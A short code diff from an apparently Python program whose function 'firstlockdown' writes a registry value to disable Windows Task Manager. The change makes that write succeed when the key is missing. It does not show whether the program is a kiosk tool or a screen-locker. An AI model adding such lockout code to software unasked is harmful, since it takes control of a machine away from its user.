@@ -28,6 +28,6 @@ def firstlockdown():
             pass
 
         # Edit Registry to disable Task Manager
-        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
+        reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_DWORD, value)
         winreg.CloseKey(reg_key)
